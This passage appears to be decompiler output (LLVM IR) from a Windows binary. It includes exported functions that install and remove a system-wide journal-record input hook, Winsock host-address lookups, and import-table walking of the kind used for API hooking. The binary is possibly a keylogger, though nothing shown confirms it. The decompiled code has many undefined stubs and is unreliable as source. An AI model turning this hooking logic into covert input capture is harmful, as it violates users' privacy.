  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1820
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1821
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1822
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1822
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1823
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1824
  %16 = ashr i32 %15, 31, !insn.addr !1825
  %17 = zext i32 %15 to i64, !insn.addr !1826
  %18 = zext i32 %16 to i64, !insn.addr !1826
  %19 = mul i64 %18, 4294967296, !insn.addr !1826
  %20 = or i64 %19, %17, !insn.addr !1826
  %21 = zext i32 %4 to i64, !insn.addr !1826
  %22 = sdiv i64 %20, %21, !insn.addr !1826
  %23 = trunc i64 %22 to i32, !insn.addr !1826
  ret i32 %23, !insn.addr !1827
}

define i32 @function_407348() local_unnamed_addr {
dec_label_pc_407348:
  %esp.0.reg2mem = alloca i32, !insn.addr !1828
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1829
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1829
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1829
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1830
  %2 = load i32, i32* @global_var_408154, align 4, !insn.addr !1831
  %3 = icmp eq i32 %2, 0, !insn.addr !1831
  br i1 %3, label %dec_label_pc_407384, label %dec_label_pc_407371, !insn.addr !1832

dec_label_pc_407371:                              ; preds = %dec_label_pc_407348
  %4 = inttoptr i32 %2 to i32*, !insn.addr !1833
  store i32 0, i32* %4, align 4, !insn.addr !1833
  br label %dec_label_pc_407384, !insn.addr !1834

dec_label_pc_407384:                              ; preds = %dec_label_pc_407371, %dec_label_pc_407348
  %5 = load i32, i32* @global_var_40813c, align 4, !insn.addr !1835
  %6 = icmp eq i32 %5, 0, !insn.addr !1835
  br i1 %6, label %dec_label_pc_407398, label %dec_label_pc_40738e, !insn.addr !1836

dec_label_pc_40738e:                              ; preds = %dec_label_pc_407384
  %7 = load i32, i32* @global_var_408140, align 4, !insn.addr !1837
  %8 = icmp eq i32 %7, 0, !insn.addr !1837
  %9 = icmp eq i1 %8, false, !insn.addr !1838
  br i1 %9, label %dec_label_pc_4073a2, label %dec_label_pc_407398, !insn.addr !1838

dec_label_pc_407398:                              ; preds = %dec_label_pc_40738e, %dec_label_pc_407384
  %10 = call i32 @function_40747c(), !insn.addr !1839
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1840
  br label %dec_label_pc_40743f, !insn.addr !1840

dec_label_pc_4073a2:                              ; preds = %dec_label_pc_40738e
  %11 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !1841
  %12 = icmp eq i8 %11, 0, !insn.addr !1841
  br i1 %12, label %dec_label_pc_4073cb, label %dec_label_pc_4073ac, !insn.addr !1842

dec_label_pc_4073ac:                              ; preds = %dec_label_pc_4073a2
  %13 = call i32 @function_406c64(), !insn.addr !1843
  %14 = icmp eq i32 %13, 0, !insn.addr !1844
  br i1 %14, label %dec_label_pc_4073cb, label %dec_label_pc_4073c4, !insn.addr !1845

dec_label_pc_4073c4:                              ; preds = %dec_label_pc_4073ac
  %15 = call i32 @function_40747c(), !insn.addr !1846
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1847
  br label %dec_label_pc_40743f, !insn.addr !1847

dec_label_pc_4073cb:                              ; preds = %dec_label_pc_4073ac, %dec_label_pc_4073a2
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1848
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1849
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1850
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1851
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1852
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1852
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1853
  %23 = call i32 @function_40747c(), !insn.addr !1854
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1854
  br label %dec_label_pc_40743f, !insn.addr !1854

dec_label_pc_40743f:                              ; preds = %dec_label_pc_4073cb, %dec_label_pc_4073c4, %dec_label_pc_407398
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1855
  %25 = load i32, i32* %24, align 4, !insn.addr !1855
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1856
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1857
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1857
  store i32 4224092, i32* %27, align 4, !insn.addr !1857
  %28 = call i32 @"@LStrClr"(), !insn.addr !1858
  ret i32 %28, !insn.addr !1859
}

define i32 @function_407455() local_unnamed_addr {
dec_label_pc_407455:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1860
  ret i32 %0, !insn.addr !1860
}

define i32 @function_40745a() local_unnamed_addr {
dec_label_pc_40745a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1861
}

define i32 @function_40745c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_40745c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1862
}

define i32 @function_40747c() local_unnamed_addr {
dec_label_pc_40747c:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1863
  %1 = call i32 @"@LStrClr"(), !insn.addr !1864
  ret i32 %1, !insn.addr !1865
}

define i32 @function_407494() local_unnamed_addr {
dec_label_pc_407494:
  %eax.0.reg2mem = alloca i32, !insn.addr !1866
  %esp.0.reg2mem = alloca i32, !insn.addr !1866
  %esp.15.reg2mem = alloca i32, !insn.addr !1866
  %storemerge6.reg2mem = alloca i32, !insn.addr !1866
  %.reg2mem = alloca i32, !insn.addr !1866
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1866
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1867
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1868
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1869
  %5 = call i32 @"@LStrClr"(), !insn.addr !1870
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1871
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1871
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1872
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1873
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1874
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1874
  %11 = icmp eq %hostent* %9, null, !insn.addr !1875
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1876
  br i1 %11, label %dec_label_pc_4074f2, label %dec_label_pc_4074cc, !insn.addr !1876

dec_label_pc_4074cc:                              ; preds = %dec_label_pc_407494
  %12 = add i32 %10, 12, !insn.addr !1877
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1877
  %14 = load i32, i32* %13, align 4, !insn.addr !1877
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1878
  %16 = load i32, i32* %15, align 4, !insn.addr !1878
  %17 = icmp eq i32 %16, 0, !insn.addr !1879
  %18 = icmp eq i1 %17, false, !insn.addr !1880
  br i1 %18, label %dec_label_pc_4074d3.lr.ph, label %dec_label_pc_4074ed, !insn.addr !1880

dec_label_pc_4074d3.lr.ph:                        ; preds = %dec_label_pc_4074cc
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1873
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_4074d3

dec_label_pc_4074d3:                              ; preds = %dec_label_pc_4074d3.lr.ph, %dec_label_pc_4074e5
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1881
  %21 = icmp eq i1 %20, false, !insn.addr !1882
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1882
  br i1 %21, label %dec_label_pc_4074e5, label %dec_label_pc_4074d7, !insn.addr !1882

dec_label_pc_4074d7:                              ; preds = %dec_label_pc_4074d3
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1883
  %23 = load i32, i32* %22, align 4, !insn.addr !1883
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1883
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1883
  store i32 %23, i32* %25, align 4, !insn.addr !1883
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1884
  %27 = call i32 @StrPas(), !insn.addr !1885
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1885
  br label %dec_label_pc_4074e5, !insn.addr !1885

dec_label_pc_4074e5:                              ; preds = %dec_label_pc_4074d7, %dec_label_pc_4074d3
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1886
  %29 = mul i32 %28, 4, !insn.addr !1878
  %30 = add i32 %29, %14, !insn.addr !1878
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1878
  %32 = load i32, i32* %31, align 4, !insn.addr !1878
  %33 = icmp eq i32 %32, 0, !insn.addr !1879
  %34 = icmp eq i1 %33, false, !insn.addr !1880
  store i32 %32, i32* %.reg2mem, !insn.addr !1880
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1880
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1880
  br i1 %34, label %dec_label_pc_4074d3, label %dec_label_pc_4074ed, !insn.addr !1880

dec_label_pc_4074ed:                              ; preds = %dec_label_pc_4074e5, %dec_label_pc_4074cc
  %35 = call i32 @WSACleanup(), !insn.addr !1887
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1887
  br label %dec_label_pc_4074f2, !insn.addr !1887

dec_label_pc_4074f2:                              ; preds = %dec_label_pc_4074ed, %dec_label_pc_407494
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1888
}

define i32 @function_407500() local_unnamed_addr {
dec_label_pc_407500:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1889
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1889
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1889
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1890
  %2 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1891
  %3 = add i32 %2, 1, !insn.addr !1891
  store i32 %3, i32* @global_var_4096e0, align 4, !insn.addr !1891
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1892
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1893
  ret i32 0, !insn.addr !1894
}

define i32 @function_407525() local_unnamed_addr {
dec_label_pc_407525:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1895
  ret i32 %0, !insn.addr !1895
}

define i32 @function_40752a() local_unnamed_addr {
dec_label_pc_40752a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1896
}

define i32 @function_40752c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40752c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1897
}

define i32 @function_407530() local_unnamed_addr {
dec_label_pc_407530:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e0, align 4, !insn.addr !1898
  %2 = add i32 %1, -1, !insn.addr !1898
  store i32 %2, i32* @global_var_4096e0, align 4, !insn.addr !1898
  ret i32 %0, !insn.addr !1899
}

define i32 @function_407538(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407538:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1900
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1900
  ret i32 %2, !insn.addr !1901
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_407558:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224312 to i32*), i32 3), !insn.addr !1902
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1902
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !1903
  %3 = icmp eq i32* %1, null, !insn.addr !1904
  %4 = icmp eq i1 %3, false, !insn.addr !1905
  %5 = sext i1 %4 to i32, !insn.addr !1906
  ret i32 %5, !insn.addr !1907
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407584:
  %0 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !1908
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1909
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !1909
  %3 = sext i1 %2 to i32, !insn.addr !1909
  ret i32 %3, !insn.addr !1910
}

define i32 @function_407590() local_unnamed_addr {
dec_label_pc_407590:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1911
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1911
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1911
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1912
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1913
  %3 = add i32 %2, 1, !insn.addr !1913
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !1913
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1914
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1915
  ret i32 0, !insn.addr !1916
}

define i32 @function_4075b5() local_unnamed_addr {
dec_label_pc_4075b5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1917
  ret i32 %0, !insn.addr !1917
}

define i32 @function_4075ba() local_unnamed_addr {
dec_label_pc_4075ba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1918
}

define i32 @function_4075bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075bc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1919
}

define i32 @function_4075c0() local_unnamed_addr {
dec_label_pc_4075c0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !1920
  %2 = add i32 %1, -1, !insn.addr !1920
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !1920
  ret i32 %0, !insn.addr !1921
}

define i32* @function_4075c8(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_4075c8:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !1922
  ret i32* %0, !insn.addr !1922
}

define i32 @function_4075d0() local_unnamed_addr {
dec_label_pc_4075d0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1923
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1923
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1923
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1924
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1925
  %3 = add i32 %2, 1, !insn.addr !1925
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !1925
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1926
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1927
  ret i32 0, !insn.addr !1928
}

define i32 @function_4075f5() local_unnamed_addr {
dec_label_pc_4075f5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1929
  ret i32 %0, !insn.addr !1929
}

define i32 @function_4075fa() local_unnamed_addr {
dec_label_pc_4075fa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1930
}

define i32 @function_4075fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075fc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1931
}

define i32 @function_407600() local_unnamed_addr {
dec_label_pc_407600:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !1932
  %2 = add i32 %1, -1, !insn.addr !1932
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !1932
  ret i32 %0, !insn.addr !1933
}

define i32 @function_407660(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407660:
  %esp.1.reg2mem = alloca i32, !insn.addr !1934
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1934
  %eax.0.reg2mem = alloca i32, !insn.addr !1934
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !1935
  %7 = icmp eq i8 %6, 0, !insn.addr !1935
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !1936
  br i1 %7, label %dec_label_pc_407673, label %dec_label_pc_40766b, !insn.addr !1936

dec_label_pc_40766b:                              ; preds = %dec_label_pc_407660
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !1937
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !1937
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !1937
  br label %dec_label_pc_407673, !insn.addr !1937

dec_label_pc_407673:                              ; preds = %dec_label_pc_40766b, %dec_label_pc_407660
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !1938
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1939
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !1939
  %13 = ptrtoint i32* %12 to i32, !insn.addr !1939
  %14 = add i32 %eax.0.reload, 8, !insn.addr !1940
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1940
  store i32 %13, i32* %15, align 4, !insn.addr !1940
  %16 = icmp eq i32* %12, null, !insn.addr !1941
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1942
  br i1 %16, label %dec_label_pc_4076cb, label %dec_label_pc_40768f, !insn.addr !1942

dec_label_pc_40768f:                              ; preds = %dec_label_pc_407673
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !1943
  %18 = add i32 %eax.0.reload, 12, !insn.addr !1944
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1944
  store i32 %17, i32* %19, align 4, !insn.addr !1944
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !1945
  %21 = add i32 %eax.0.reload, 16, !insn.addr !1946
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1946
  store i32 %20, i32* %22, align 4, !insn.addr !1946
  %23 = add i32 %eax.0.reload, 20, !insn.addr !1947
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1947
  store i32 %arg3, i32* %24, align 4, !insn.addr !1947
  %25 = load i32, i32* %22, align 4, !insn.addr !1948
  %26 = add i32 %esp.0, -8, !insn.addr !1949
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1949
  store i32 %25, i32* %27, align 4, !insn.addr !1949
  %28 = add i32 %esp.0, -12, !insn.addr !1950
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1950
  store i32 %17, i32* %29, align 4, !insn.addr !1950
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !1951
  %31 = ptrtoint i32* %30 to i32, !insn.addr !1951
  %32 = add i32 %esp.0, -16, !insn.addr !1952
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1952
  store i32 %31, i32* %33, align 4, !insn.addr !1952
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !1953
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !1953
  %36 = add i32 %eax.0.reload, 24, !insn.addr !1954
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1954
  store i32 %35, i32* %37, align 4, !insn.addr !1954
  %38 = icmp eq i32 ()* %34, null, !insn.addr !1955
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !1956
  br i1 %38, label %dec_label_pc_4076cb, label %dec_label_pc_4076b7, !insn.addr !1956

dec_label_pc_4076b7:                              ; preds = %dec_label_pc_40768f
  %39 = load i32, i32* %24, align 4, !insn.addr !1957
  %40 = add i32 %esp.0, -20, !insn.addr !1958
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1958
  store i32 %39, i32* %41, align 4, !insn.addr !1958
  %42 = load i32, i32* %15, align 4, !insn.addr !1959
  %43 = add i32 %esp.0, -24, !insn.addr !1960
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1960
  store i32 %42, i32* %44, align 4, !insn.addr !1960
  %45 = call i32 @function_407734(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1961
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !1961
  br label %dec_label_pc_4076cb, !insn.addr !1961

dec_label_pc_4076cb:                              ; preds = %dec_label_pc_4076b7, %dec_label_pc_40768f, %dec_label_pc_407673
  br i1 %7, label %dec_label_pc_4076e2, label %dec_label_pc_4076d3, !insn.addr !1962

dec_label_pc_4076d3:                              ; preds = %dec_label_pc_4076cb
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !1963
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !1964
  %48 = load i32, i32* %47, align 4, !insn.addr !1964
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !1964
  br label %dec_label_pc_4076e2, !insn.addr !1965

dec_label_pc_4076e2:                              ; preds = %dec_label_pc_4076d3, %dec_label_pc_4076cb
  %49 = add i32 %eax.0.reload, 4, !insn.addr !1966
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1966
  %51 = inttoptr i32 %9 to i32*, !insn.addr !1938
  ret i32 %eax.0.reload, !insn.addr !1967
}

define i32 @function_4076ec() local_unnamed_addr {
dec_label_pc_4076ec:
  %eax.1.reg2mem = alloca i32, !insn.addr !1968
  %eax.0.reg2mem = alloca i32, !insn.addr !1968
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !1969
  %4 = add i32 %3, 8, !insn.addr !1970
  %5 = inttoptr i32 %4 to i32*, !insn.addr !1970
  %6 = load i32, i32* %5, align 4, !insn.addr !1970
  %7 = icmp eq i32 %6, 0, !insn.addr !1970
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1971
  br i1 %7, label %dec_label_pc_407726, label %dec_label_pc_4076fd, !insn.addr !1971

dec_label_pc_4076fd:                              ; preds = %dec_label_pc_4076ec
  %8 = add i32 %3, 24, !insn.addr !1972
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1972
  %10 = load i32, i32* %9, align 4, !insn.addr !1972
  %11 = icmp eq i32 %10, 0, !insn.addr !1972
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !1973
  br i1 %11, label %dec_label_pc_407726, label %dec_label_pc_407703, !insn.addr !1973

dec_label_pc_407703:                              ; preds = %dec_label_pc_4076fd
  %12 = add i32 %3, 4, !insn.addr !1974
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1974
  %14 = load i32, i32* %13, align 4, !insn.addr !1974
  %15 = inttoptr i32 %14 to i8*, !insn.addr !1975
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !1976
  %17 = ptrtoint i32* %16 to i32, !insn.addr !1976
  %18 = load i32, i32* %5, align 4, !insn.addr !1977
  %19 = icmp eq i32 %18, %17, !insn.addr !1977
  %20 = icmp eq i1 %19, false, !insn.addr !1978
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !1978
  br i1 %20, label %dec_label_pc_407726, label %dec_label_pc_407711, !insn.addr !1978

dec_label_pc_407711:                              ; preds = %dec_label_pc_407703
  %21 = load i32, i32* %9, align 4, !insn.addr !1979
  %22 = call i32 @function_407734(i32 %21), !insn.addr !1980
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !1980
  br label %dec_label_pc_407726, !insn.addr !1980

dec_label_pc_407726:                              ; preds = %dec_label_pc_407711, %dec_label_pc_407703, %dec_label_pc_4076fd, %dec_label_pc_4076ec
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !1981
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !1982
  br i1 %24, label %dec_label_pc_407731, label %dec_label_pc_40772a, !insn.addr !1982

dec_label_pc_40772a:                              ; preds = %dec_label_pc_407726
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !1983
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !1983
  br label %dec_label_pc_407731, !insn.addr !1983

dec_label_pc_407731:                              ; preds = %dec_label_pc_40772a, %dec_label_pc_407726
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !1984
}

define i32 @function_407734(i32 %arg1) local_unnamed_addr {
dec_label_pc_407734:
  %eax.0.reg2mem = alloca i32, !insn.addr !1985
  %esp.0.reg2mem = alloca i32, !insn.addr !1985
  %storemerge6.reg2mem = alloca i32, !insn.addr !1985
  %.reg2mem14 = alloca i32, !insn.addr !1985
  %esp.17.reg2mem = alloca i32, !insn.addr !1985
  %esi.08.reg2mem = alloca i32, !insn.addr !1985
  %.reg2mem = alloca i32, !insn.addr !1985
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !1986
  %4 = icmp eq i1 %3, false, !insn.addr !1987
  %5 = icmp eq i32 %arg1, 0, !insn.addr !1988
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_4077e1, label %dec_label_pc_40775a, !insn.addr !1987

dec_label_pc_40775a:                              ; preds = %dec_label_pc_407734
  %6 = trunc i32 %2 to i16, !insn.addr !1989
  %7 = trunc i32 %1 to i8, !insn.addr !1990
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !1991
  %8 = inttoptr i32 %0 to i32*, !insn.addr !1992
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !1992
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1992
  %11 = icmp eq i32* %9, null, !insn.addr !1993
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1994
  br i1 %11, label %dec_label_pc_4077e1, label %dec_label_pc_4077da.preheader, !insn.addr !1994

dec_label_pc_4077da.preheader:                    ; preds = %dec_label_pc_40775a
  %12 = add i32 %10, 12, !insn.addr !1995
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1995
  %14 = load i32, i32* %13, align 4, !insn.addr !1995
  %15 = icmp eq i32 %14, 0, !insn.addr !1996
  %16 = icmp eq i1 %15, false, !insn.addr !1997
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !1997
  br i1 %16, label %dec_label_pc_407773.lr.ph, label %dec_label_pc_4077e1, !insn.addr !1997

dec_label_pc_407773.lr.ph:                        ; preds = %dec_label_pc_4077da.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !1991
  %sext = mul i32 %1, 16777216
